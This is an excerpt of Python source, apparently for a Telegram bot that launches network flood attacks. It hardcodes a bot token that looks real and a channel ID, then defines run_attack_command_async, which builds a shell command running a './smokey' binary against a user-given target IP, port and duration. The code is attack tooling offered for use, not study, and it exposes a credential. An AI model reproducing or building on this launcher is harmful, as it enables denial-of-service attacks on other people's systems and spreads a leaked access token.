...
# Bot Token & Group ID
TOKEN = "7581242120:AAECD0DyAS-M4HV5YXYrLyFfXKYd1XvNId8"  # Replace with actual bot token
CHANNEL_ID = -1002305832473  # Replace with your group/channel ID
...
async def run_attack_command_async(target_ip, target_port, duration, chat_id, bot):
    try:
        command = f"./smokey {target_ip} {target_port} {duration} 1400"
